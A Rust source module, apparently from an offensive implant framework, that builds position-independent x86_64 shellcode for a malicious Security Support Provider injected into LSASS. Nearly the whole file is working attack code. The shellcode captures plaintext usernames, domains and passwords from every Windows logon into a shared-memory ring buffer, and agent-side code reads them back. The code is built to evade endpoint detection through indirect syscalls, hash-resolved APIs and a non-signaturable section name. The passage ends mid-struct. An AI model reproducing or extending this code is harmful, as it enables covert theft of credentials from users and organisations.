//! Position-independent SSP (Security Support Provider) stub for in-memory
//! LSASS injection.
//!
//! This module builds a minimal, relocatable SSP DLL image entirely in memory.
//! The image exports three callbacks required by the LSA SSP interface:
//!
//! - `SpInitialize`  — one-time initialisation (creates a named shared memory
//!   section for credential exfiltration).
//! - `SpShutDown`    — cleanup on SSP unload.
//! - `SpAcceptCredentials` — called by LSA for every authentication event;
//!   captures the supplied credentials into the shared memory ring buffer.
//!
//! # Constraints
//!
//! - **No DLL on disk.** The entire PE image is crafted in a `Vec<u8>` and
//!   injected into LSASS via `NtWriteVirtualMemory`.
//! - **Position-independent.** All address references use RIP-relative
//!   addressing or are patched at injection time via a relocation table.
//! - **Indirect syscalls only.** Memory allocation, writing, and thread
//!   creation in LSASS use the agent's indirect syscall infrastructure
//!   (`crate::syscalls::do_syscall`) to avoid ntdll IAT hooks.
//!
//! # Shared Memory Protocol
//!
//! The SSP stub communicates with the agent through a named file mapping
//! (name derived from the PSK via HKDF-SHA256).  The layout of the shared section is:
//!
//! ```text
//! offset 0   : u32  write_index   (next write position, atomically incremented)
//! offset 4   : u32  read_index    (next read position, set by agent)
//! offset 8   : u32  count         (total credentials written)
//! offset 12  : u32  generation    (incremented on overflow/wrap)
//! offset 16  : CredSlot[RING_CAPACITY]  (ring buffer of captured creds)
//! ```
//!
//! Each `CredSlot` is a fixed-size record:
//!
//! ```text
//! offset 0   : [u8; 64]  username  (UTF-16LE, null-padded)
//! offset 64  : [u8; 64]  domain    (UTF-16LE, null-padded)
//! offset 128 : [u8; 128] password  (UTF-16LE, null-padded; or hex hash)
//! offset 256 : u32       cred_type (0=msv, 1=wdigest, 2=kerberos, 3=dpapi)
//! offset 260 : u32       flags     (bit 0 = plaintext, bit 1 = hash)
//! total size : 264 bytes
//! ```

#![cfg(all(windows, feature = "lsa-whisperer"))]

use anyhow::{anyhow, Result};

/// Ring buffer capacity — 256 credential slots × 264 bytes ≈ 66 KB.
pub const RING_CAPACITY: u32 = 256;

/// Size of a single credential slot in bytes.
pub const CRED_SLOT_SIZE: usize = 264;

/// Total shared section size: header (16 bytes) + ring.
pub const SHM_SIZE: usize = 16 + (RING_CAPACITY as usize) * CRED_SLOT_SIZE;

/// Shared memory section name — generated once per agent process.
///
/// Derived from the agent's PSK via HKDF-SHA256 so the name is:
///   • deterministic per-deployment (SSP in LSASS and agent derive the same name)
///   • unique per-deployment (different PSKs produce different names)
///   • not a static string EDR can signature-match
///
/// Format: `Global\` + 32 lowercase hex characters (first 16 bytes of
/// HKDF-SHA256 output).  The `Global\` prefix ensures cross-session
/// visibility.  If no PSK is configured, falls back to 32 random bytes.
static SHM_NAME: once_cell::sync::Lazy<Vec<u16>> =
    once_cell::sync::Lazy::new(generate_shm_name);

/// Derive the shared memory section name from the PSK.
///
/// Uses HKDF-SHA256 with the PSK as IKM and a fixed info string to produce
/// 16 bytes, then hex-encodes them (32 characters) prefixed by `Global\`.
/// Total length: 7 + 32 = 39 chars, well under the 260-char NT object name limit.
fn generate_shm_name() -> Vec<u16> {
    let psk = crate::outbound::resolve_secret()
        .unwrap_or_else(|| {
            log::warn!("lsa_whisperer_ssp: no PSK configured; SHM name uses random fallback");
            // Fall back to random bytes so the agent still works in dev/test.
            use rand::RngCore;
            let mut ikm = [0u8; 32];
            rand::rngs::OsRng.fill_bytes(&mut ikm);
            hex::encode(ikm)
        });

    let hkdf = hkdf::Hkdf::<sha2::Sha256>::new(None, psk.as_bytes());
    let mut derived = [0u8; 16];
    hkdf.expand(b"orchestra-ssp-shm-name", &mut derived)
        .expect("HKDF expand for SSP SHM name must succeed");

    let full = format!("Global\\{}", hex::encode(derived));
    let mut wide: Vec<u16> = full.encode_utf16().collect();
    wide.push(0); // null terminator
    wide
}

// ── Credential type tags (written by the SSP stub, read by the agent) ──────

pub const CRED_TYPE_MSV: u32 = 0;
pub const CRED_TYPE_WDIGEST: u32 = 1;
pub const CRED_TYPE_KERBEROS: u32 = 2;
pub const CRED_TYPE_DPAPI: u32 = 3;

// ── Credential slot flags ──────────────────────────────────────────────────

pub const FLAG_PLAINTEXT: u32 = 0x01;
pub const FLAG_HASH: u32 = 0x02;

// ── Shared memory header layout ────────────────────────────────────────────

/// Header at the start of the shared memory section.
#[repr(C)]
pub struct ShmHeader {
    pub write_index: u32,
    pub read_index: u32,
    pub count: u32,
    pub generation: u32,
}

/// A single credential slot in the ring buffer.
#[repr(C)]
pub struct CredSlot {
    pub username: [u8; 64],
    pub domain: [u8; 64],
    pub password: [u8; 128],
    pub cred_type: u32,
    pub flags: u32,
}

// ── SSP shellcode builder ──────────────────────────────────────────────────

/// Build a minimal, position-independent PE image that implements the SSP
/// interface (SpInitialize, SpShutDown, SpAcceptCredentials).
///
/// Rather than constructing a full PE from scratch (which would be fragile
/// and large), we compile a Rust function with `#[no_mangle]` and the right
/// calling convention, then extract its machine code.  However, since we
/// cannot do that at runtime, we instead build a minimal position-independent
/// code blob that:
///
/// 1. On `SpInitialize`: creates the shared memory section via `NtCreateSection`
///    + `NtMapViewOfSection`, resolved by hash from ntdll.dll.
/// 2. On `SpAcceptCredentials`: copies credential strings from the LSA-supplied
///    UNICODE_STRING structures into the next available ring slot.
/// 3. On `SpShutDown`: unmaps and closes the shared section.
///
/// The blob uses a trampoline table at the end for all external references
/// (ntdll function hashes), which the injector patches with resolved addresses
/// before writing into LSASS.
///
/// # Returns
///
/// A `Vec<u8>` containing the complete SSP code blob ready for injection.
///
/// # Architecture
///
/// x86_64 only.  The code is built as a flat binary with a small dispatch
/// table at the start that the LSA SSP loader will call into.
pub fn build_ssp_blob() -> Result<Vec<u8>> {
    // ── Blob layout ────────────────────────────────────────────────
    //   0x000: SpInitialize  — stub (xor eax,eax; ret)
    //   0x020: SpShutDown    — stub (xor eax,eax; ret)
    //   0x040: SpAcceptCredentials — credential capture shellcode
    //   0x300: Data section   — section name (UTF-16LE)
    //   0x400: Function pointer table (pre-resolved ntdll addresses)
    //
    // All address references use the call/pop technique to obtain a
    // position-independent anchor.  On Windows 10+, ntdll.dll loads at
    // the same base address in every process, so function pointers
    // resolved in the agent process are valid inside LSASS.

    const OFF_DATA: usize = 0x300;
    const OFF_FT: usize   = 0x400;

    let mut blob = Vec::with_capacity(0x800);

    // Jump-patch bookkeeping: (rel32_patch_offset, label_id)
    let mut near_patches: Vec<(usize, usize)> = Vec::new();
    let mut label_offsets: [usize; 2] = [0; 2];
    const L_EPILOGUE: usize = 0;
    const L_CLOSE:    usize = 1;

    // ═══════════════════════════════════════════════════════════════
    //  SpInitialize (0x000) — stub: return STATUS_SUCCESS
    // ═══════════════════════════════════════════════════════════════
    blob.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
    blob.extend_from_slice(&[0x31, 0xC0]);               // xor eax, eax
    blob.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
    blob.push(0xC3);                                     // ret
    blob.resize(0x020, 0x90);

    // ═══════════════════════════════════════════════════════════════
    //  SpShutDown (0x020) — stub: return STATUS_SUCCESS
    // ═══════════════════════════════════════════════════════════════
    blob.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
    blob.extend_from_slice(&[0x31, 0xC0]);
    blob.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
    blob.push(0xC3);
    blob.resize(0x040, 0x90);


    // ═══════════════════════════════════════════════════════════════
    //  SpAcceptCredentials (0x040) — credential capture
    //
    //  Windows x64 calling convention:
    //    rcx = LogonType  (unused)
    //    rdx = PSESS_PRIMARY_CREDENTIAL (credential struct)
    //    r8  = Supplemental credentials (unused)
    //
    //  PSESS_PRIMARY_CREDENTIAL layout:
    //    +0x00: UserName  (UNICODE_STRING: u16 Len, u16 Max, u32 pad, u64 Buf)
    //    +0x10: Domain    (UNICODE_STRING)
    //    +0x20: Password  (UNICODE_STRING)
    //
    //  Register allocation:
    //    r15 = position-independent anchor (address of pop-r15)
    //    r14 = mapped section base
    //    r13 = credential struct pointer (from rdx)
    //    r12 = temp (UNICODE_STRING buffer pointer)
    //    rbx = CredSlot base
    //    rsi/rdi = copy source/dest (for rep movsb)
    //
    //  Stack frame (after sub rsp, 0x108):
    //    [rsp+0x00..0x1F]  shadow space (32)
    //    [rsp+0x20..0x4F]  stack params  (48, reused per call)
    //    [rsp+0x50]        SectionHandle (8)
    //    [rsp+0x58]        BaseAddress   (8)
    //    [rsp+0x60]        ViewSize      (8)
    //    [rsp+0x68..0x77]  UNICODE_STRING for section name (16)
    //    [rsp+0x78..0xA7]  OBJECT_ATTRIBUTES (48)
    // ═══════════════════════════════════════════════════════════════

    // ── Prologue ──────────────────────────────────────────────────
    blob.extend_from_slice(&[0x55]);                         // push rbp
    blob.extend_from_slice(&[0x53]);                         // push rbx
    blob.extend_from_slice(&[0x56]);                         // push rsi
    blob.extend_from_slice(&[0x57]);                         // push rdi
    blob.extend_from_slice(&[0x41, 0x54]);                   // push r12
    blob.extend_from_slice(&[0x41, 0x55]);                   // push r13
    blob.extend_from_slice(&[0x41, 0x56]);                   // push r14
    blob.extend_from_slice(&[0x41, 0x57]);                   // push r15
    blob.extend_from_slice(&[0x48, 0x81, 0xEC]);             // sub rsp, 0x108
    blob.extend_from_slice(&0x108u32.to_le_bytes());
    blob.extend_from_slice(&[0x4D, 0x89, 0xC5]);             // mov r13, r8
    // Get position-independent anchor: call $+5; pop r15
    blob.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
    blob.extend_from_slice(&[0x41, 0x5F]);                   // pop r15
    // r15 = address of the pop-r15 instruction
    let r15_off = blob.len() - 2;

    // Deltas from r15 to key blob offsets
    let d_data = (OFF_DATA - r15_off) as u32;
    let d_ft0  = (OFF_FT      - r15_off) as u32; // NtOpenSection
    let d_ft1  = (OFF_FT +  8 - r15_off) as u32; // NtMapViewOfSection
    let d_ft2  = (OFF_FT + 16 - r15_off) as u32; // NtUnmapViewOfSection
    let d_ft3  = (OFF_FT + 24 - r15_off) as u32; // NtClose

    // ── Validate credential pointer ───────────────────────────────
    blob.extend_from_slice(&[0x4D, 0x85, 0xED]);             // test r13, r13
    // jz epilogue (near, patched later)
    let jz_cred_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
    near_patches.push((jz_cred_patch, L_EPILOGUE));

    // ── Zero the stack frame (264 bytes = 33 qwords) ──────────────
    blob.extend_from_slice(&[0x31, 0xC0]);                           // xor eax, eax
    blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]);        // mov ecx, 33
    blob.extend_from_slice(&[0x48, 0x89, 0xE7]);                     // mov rdi, rsp
    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);                     // rep stosq

    // ── Build UNICODE_STRING at [rsp+0x68] ────────────────────────
    let shm_name = &*SHM_NAME;
    let name_chars = shm_name.len() - 1; // exclude null terminator
    let name_byte_len = (name_chars * 2) as u16;

    // Buffer = r15 + d_data (address of name bytes in the blob)
    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_data]
    blob.extend_from_slice(&d_data.to_le_bytes());
    blob.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x70]); // mov [rsp+0x70], rax
    blob.extend_from_slice(&[0x66, 0xC7, 0x44, 0x24, 0x68]); // mov word [rsp+0x68], len
    blob.extend_from_slice(&name_byte_len.to_le_bytes());
    blob.extend_from_slice(&[0x66, 0xC7, 0x44, 0x24, 0x6A]); // mov word [rsp+0x6A], maxlen
    blob.extend_from_slice(&name_byte_len.to_le_bytes());

    // ── Build OBJECT_ATTRIBUTES at [rsp+0x78] ─────────────────────
    blob.extend_from_slice(&[0x48, 0x8D, 0x5C, 0x24, 0x78]); // lea rbx, [rsp+0x78]
    blob.extend_from_slice(&[0xC7, 0x03, 0x30, 0x00, 0x00, 0x00]); // mov dword [rbx], 48
    blob.extend_from_slice(&[0x48, 0x8D, 0x44, 0x24, 0x68]); // lea rax, [rsp+0x68]
    blob.extend_from_slice(&[0x48, 0x89, 0x43, 0x10]);        // mov [rbx+0x10], rax
    blob.extend_from_slice(&[0xC7, 0x43, 0x18, 0x40, 0x00, 0x00, 0x00]); // mov dword [rbx+0x18], 0x40

    // ── NtOpenSection(&handle, SECTION_MAP_RW, &obj_attr) ─────────
    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft0]
    blob.extend_from_slice(&d_ft0.to_le_bytes());
    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
    blob.extend_from_slice(&[0x48, 0x85, 0xC0]);             // test rax, rax
    // jz epilogue (near)
    let jz_open_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
    near_patches.push((jz_open_patch, L_EPILOGUE));
    blob.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x50]); // lea rcx, [rsp+0x50]
    blob.extend_from_slice(&[0xBA, 0x06, 0x00, 0x00, 0x00]); // mov edx, 0x0006
    blob.extend_from_slice(&[0x4C, 0x8D, 0x44, 0x24, 0x78]); // lea r8, [rsp+0x78]
    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    // js epilogue (near)
    let js_open_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x88, 0x00, 0x00, 0x00, 0x00]);
    near_patches.push((js_open_patch, L_EPILOGUE));

    // ── NtMapViewOfSection(10 params) ─────────────────────────────
    // Stack params (5th-10th): CommitSize=0, SectionOffset=NULL,
    //   &ViewSize, InheritDisposition=1, AllocationType=0, Protect=4
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20,
                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x20] CommitSize = 0
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x28,
                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x28] SectionOffset = NULL
    blob.extend_from_slice(&[0x48, 0x8D, 0x44, 0x24, 0x60]); // lea rax, [rsp+0x60]
    blob.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x30]); // [rsp+0x30] = &ViewSize
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x38,
                             0x01, 0x00, 0x00, 0x00]);         // [rsp+0x38] InheritDisposition = 1
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x40,
                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x40] AllocationType = 0
    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x48,
                             0x04, 0x00, 0x00, 0x00]);         // [rsp+0x48] Win32Protect = 4
    // Load function pointer
    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft1]
    blob.extend_from_slice(&d_ft1.to_le_bytes());
    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
    // Register params
    blob.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x50]); // mov rcx, [rsp+0x50] SectionHandle
    blob.extend_from_slice(&[0x48, 0xC7, 0xC2,
                             0xFF, 0xFF, 0xFF, 0xFF]);         // mov rdx, -1 (current process)
    blob.extend_from_slice(&[0x4C, 0x8D, 0x44, 0x24, 0x58]); // lea r8, [rsp+0x58] &BaseAddress
    blob.extend_from_slice(&[0x45, 0x31, 0xC9]);             // xor r9d, r9d  ZeroBits=0
    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    // js close (near)
    let js_map_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x88, 0x00, 0x00, 0x00, 0x00]);
    near_patches.push((js_map_patch, L_CLOSE));

    // Load mapped base address
    blob.extend_from_slice(&[0x4C, 0x8B, 0x74, 0x24, 0x58]); // mov r14, [rsp+0x58]
    blob.extend_from_slice(&[0x4D, 0x85, 0xF6]);             // test r14, r14
    // jz close (near)
    let jz_base_patch = blob.len() + 2;
    blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
    near_patches.push((jz_base_patch, L_CLOSE));

    // ── Read ring buffer header -> compute slot address ────────────
    blob.extend_from_slice(&[0x41, 0x8B, 0x06]);             // mov eax, [r14]  write_index
    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
    blob.extend_from_slice(&[0x83, 0xE1, 0xFF]);             // and ecx, 0xFF   mod 256
    blob.extend_from_slice(&[0x69, 0xC9, 0x08, 0x01,
                             0x00, 0x00]);                     // imul ecx, ecx, 264
    blob.extend_from_slice(&[0x49, 0x8D, 0x5E, 0x10]);       // lea rbx, [r14+16]
    blob.extend_from_slice(&[0x48, 0x03, 0xD9]);             // add rbx, rcx

    // ── Zero the slot (33 qwords = 264 bytes) ─────────────────────
    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
    blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]); // mov ecx, 33
    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);             // rep stosq

    // ── Copy UserName (UNICODE_STRING at r13+0x08) ────────────────
    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x10]);       // mov r12, [r13+0x10]
    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
    blob.extend_from_slice(&[0x74, 0x1F]);                     // jz skip_username (31 bytes)
    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x08]); // movzx eax, word [r13+0x08]
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    blob.extend_from_slice(&[0x74, 0x16]);                     // jz skip_username
    blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
    blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
    // skip_username:

    // ── Copy Domain (UNICODE_STRING at r13+0x18) ──────────────────
    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x20]);       // mov r12, [r13+0x20]
    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
    blob.extend_from_slice(&[0x74, 0x20]);                     // jz skip_domain (32 bytes)
    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x18]); // movzx eax, word [r13+0x18]
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    blob.extend_from_slice(&[0x74, 0x17]);                     // jz skip_domain
    blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
    blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
    blob.extend_from_slice(&[0x48, 0x8D, 0x7B, 0x40]);       // lea rdi, [rbx+64]
    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
    // skip_domain:

    // ── Copy Password (UNICODE_STRING at r13+0x28) ────────────────
    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x30]);       // mov r12, [r13+0x30]
    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
    blob.extend_from_slice(&[0x74, 0x23]);                     // jz skip_password (35 bytes)
    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x45, 0x28]); // movzx eax, word [r13+0x28]
    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
    blob.extend_from_slice(&[0x74, 0x1A]);                     // jz skip_password
    blob.extend_from_slice(&[0x3D, 0x00, 0x01, 0x00, 0x00]); // cmp eax, 256
    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
    blob.extend_from_slice(&[0xB8, 0x00, 0x01, 0x00, 0x00]); // mov eax, 256
    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
    blob.extend_from_slice(&[0x48, 0x8D, 0xBB,
                             0x80, 0x00, 0x00, 0x00]);         // lea rdi, [rbx+128]
    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
    // skip_password:

    // ── Set flags = FLAG_PLAINTEXT (cred_type=0 already from zeroing) ──
    blob.extend_from_slice(&[0xFF, 0x83, 0x04, 0x01,
                             0x00, 0x00]);                     // inc dword [rbx+0x104]

    // ── Update ring buffer header ─────────────────────────────────
    // write_index = (old + 1) % 256
    blob.extend_from_slice(&[0x41, 0x8B, 0x06]);             // mov eax, [r14]
    blob.extend_from_slice(&[0xFF, 0xC0]);                     // inc eax
    blob.extend_from_slice(&[0x0F, 0xB6, 0xC0]);             // movzx eax, al
    blob.extend_from_slice(&[0x41, 0x89, 0x06]);             // mov [r14], eax
    // count++
    blob.extend_from_slice(&[0x41, 0xFF, 0x46, 0x08]);       // inc dword [r14+8]

    // ── NtUnmapViewOfSection(-1, r14) ─────────────────────────────
    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft2]
    blob.extend_from_slice(&d_ft2.to_le_bytes());
    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
    blob.extend_from_slice(&[0x48, 0x85, 0xC0]);             // test rax, rax
    blob.extend_from_slice(&[0x74, 0x0E]);                     // jz +14 (skip to close)
    blob.extend_from_slice(&[0x48, 0xC7, 0xC1,
                             0xFF, 0xFF, 0xFF, 0xFF]);         // mov rcx, -1
    blob.extend_from_slice(&[0x4C, 0x89, 0xF2]);             // mov rdx, r14
    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax

    // ── close: NtClose(sectionHandle) ─────────────────────────────
    label_offsets[L_CLOSE] = blob.len();
    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft3]
    blob.extend_from_slice(&d_ft3.to_le_bytes());
    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
    blob.extend_from_slice(&[0x48, 0x85, 0xC0]);             // test rax, rax
    blob.extend_from_slice(&[0x74, 0x04]);                     // jz +4 (skip to epilogue)
    blob.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x50]); // mov rcx, [rsp+0x50]
    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax

    // ── epilogue ──────────────────────────────────────────────────
    label_offsets[L_EPILOGUE] = blob.len();
    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
    blob.extend_from_slice(&[0x48, 0x81, 0xC4]);             // add rsp, 0x108
    blob.extend_from_slice(&0x108u32.to_le_bytes());
    blob.extend_from_slice(&[0x41, 0x5F]);                     // pop r15
    blob.extend_from_slice(&[0x41, 0x5E]);                     // pop r14
    blob.extend_from_slice(&[0x41, 0x5D]);                     // pop r13
    blob.extend_from_slice(&[0x41, 0x5C]);                     // pop r12
    blob.extend_from_slice(&[0x5F]);                         // pop rdi
    blob.extend_from_slice(&[0x5E]);                         // pop rsi
    blob.extend_from_slice(&[0x5B]);                         // pop rbx
    blob.extend_from_slice(&[0x5D]);                         // pop rbp
    blob.push(0xC3);                                         // ret

    // ── Patch near jumps ──────────────────────────────────────────
    for &(patch_off, lbl) in &near_patches {
        let target = label_offsets[lbl];
        let rel32 = (target as i32) - (patch_off as i32 + 4);
        blob[patch_off..patch_off + 4].copy_from_slice(&rel32.to_le_bytes());
    }

    // ── Data section (0x300) ──────────────────────────────────────
    blob.resize(OFF_DATA, 0x90);
    // Write the section name as UTF-16LE (including null terminator)
    for &w in shm_name.iter() {
        blob.extend_from_slice(&w.to_le_bytes());
    }
    blob.resize(OFF_FT, 0x00);

    // ── Function pointer table (0x400) ────────────────────────────
    // Pre-resolve ntdll exports.  On Windows 10+ ntdll is at the same
    // base address in every process, so these addresses are valid in LSASS.
    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow!("cannot resolve ntdll base address"))?;

    let resolve = |name: &[u8]| -> Result<usize> {
        let hash = pe_resolve::hash_str(name);
        pe_resolve::get_proc_address_by_hash(ntdll_base, hash)
            .ok_or_else(|| anyhow!("cannot resolve ntdll export '{}'", String::from_utf8_lossy(name)))
    };

    let nt_open_section  = resolve(b"NtOpenSection")?;
    let nt_map_view      = resolve(b"NtMapViewOfSection")?;
    let nt_unmap_view    = resolve(b"NtUnmapViewOfSection")?;
    let nt_close         = resolve(b"NtClose")?;

    blob.extend_from_slice(&nt_open_section.to_le_bytes());
    blob.extend_from_slice(&nt_map_view.to_le_bytes());
    blob.extend_from_slice(&nt_unmap_view.to_le_bytes());
    blob.extend_from_slice(&nt_close.to_le_bytes());

    log::info!(
        "LSA Whisperer: SSP blob built ({} bytes, SHM name {} chars)",
        blob.len(),
        name_chars,
    );

    assert!(blob.len() <= 0x1000, "SSP blob exceeds 4096 bytes");

    Ok(blob)
}

/// Trampoline table layout for SSP injection.
///
/// The injector writes resolved function addresses into this table
/// before injecting the SSP blob into LSASS.
#[repr(C)]
pub struct TrampolineTable {
    pub nt_create_section: usize,
    pub nt_map_view_of_section: usize,
    pub nt_unmap_view_of_section: usize,
    pub nt_close: usize,
    pub nt_allocate_virtual_memory: usize,
    pub nt_write_virtual_memory: usize,
    pub nt_create_thread_ex: usize,
    pub _reserved: [usize; 1],
}

// ── Reflective SSP DLL builder ─────────────────────────────────────────────

/// Build a minimal reflective DLL that implements the SSP interface.
///
/// The DLL is a hand-crafted PE image that exports:
/// - `SpInitialize`  → creates shared memory section
/// - `SpShutDown`    → cleanup
/// - `SpAcceptCredentials` → credential capture
///
/// The DLL uses the agent's COFF/PE loader infrastructure to resolve
/// imports at runtime.
///
/// NOTE: Building a valid PE image from scratch is extremely complex.
/// Instead, we use a simpler approach: write a small piece of
/// position-independent trampoline code into LSASS that patches the
/// LSA dispatch table to intercept SpAcceptCredentials calls.
pub fn build_reflective_ssp_dll() -> Result<Vec<u8>> {
    build_ssp_blob()
}

// ── Shared memory IPC (agent side) ─────────────────────────────────────────

/// Open the shared memory section created by the SSP stub in LSASS
/// and read any captured credentials.
///
/// Returns the number of new credentials read.
pub fn read_captured_credentials(
    credentials: &mut Vec<super::lsa_whisperer::WhisperedCredential>,
) -> Result<usize> {
    use std::ptr;

    let mut section_handle: usize = 0;
    let mut status: i32;

    // Resolve NtOpenSection from ntdll via pe_resolve.
    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;

    type FnNtOpenSection = unsafe extern "system" fn(
        *mut usize,       // SectionHandle
        u32,              // DesiredAccess (SECTION_MAP_READ | SECTION_MAP_WRITE)
        *mut std::ffi::c_void, // ObjectAttributes
    ) -> i32;

    let nt_open_section: FnNtOpenSection = unsafe {
        pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtOpenSection\0"))
            .map(|addr| std::mem::transmute::<usize, FnNtOpenSection>(addr))
            .ok_or_else(|| anyhow!("cannot resolve NtOpenSection"))?
    };

    type FnNtMapViewOfSection = unsafe extern "system" fn(
        usize,            // SectionHandle
        usize,            // ProcessHandle (-1 = current)
        *mut *mut std::ffi::c_void, // BaseAddress
        usize,            // ZeroBits
        usize,            // CommitSize
        *mut std::ffi::c_void, // SectionOffset (NULL)
        *mut usize,       // ViewSize (0 = map entire section)
        u32,              // InheritDisposition (1 = ViewShare)
        u32,              // AllocationType (0)
        u32,              // Win32Protect (PAGE_READWRITE)
    ) -> i32;

    let nt_map_view: FnNtMapViewOfSection = unsafe {
        pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtMapViewOfSection\0"),
        )
        .map(|addr| std::mem::transmute::<usize, FnNtMapViewOfSection>(addr))
        .ok_or_else(|| anyhow!("cannot resolve NtMapViewOfSection"))?
    };

    type FnNtUnmapViewOfSection = unsafe extern "system" fn(
        usize,            // ProcessHandle
        *mut std::ffi::c_void, // BaseAddress
    ) -> i32;

    let nt_unmap_view: FnNtUnmapViewOfSection = unsafe {
        pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtUnmapViewOfSection\0"),
        )
        .map(|addr| std::mem::transmute::<usize, FnNtUnmapViewOfSection>(addr))
        .ok_or_else(|| anyhow!("cannot resolve NtUnmapViewOfSection"))?
    };

    type FnNtClose = unsafe extern "system" fn(usize) -> i32;
    let nt_close: FnNtClose = unsafe {
        pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"NtClose\0"))
            .map(|addr| std::mem::transmute::<usize, FnNtClose>(addr))
            .ok_or_else(|| anyhow!("cannot resolve NtClose"))?
    };

    // Build OBJECT_ATTRIBUTES for the shared section name.
    #[repr(C)]
    struct ObjAttr {
        length: u32,
        root_directory: usize,
        object_name: *mut std::ffi::c_void,
        attributes: u32,
        security_descriptor: *mut std::ffi::c_void,
        security_qos: *mut std::ffi::c_void,
    }

    #[repr(C)]
    struct UniStr {
        length: u16,
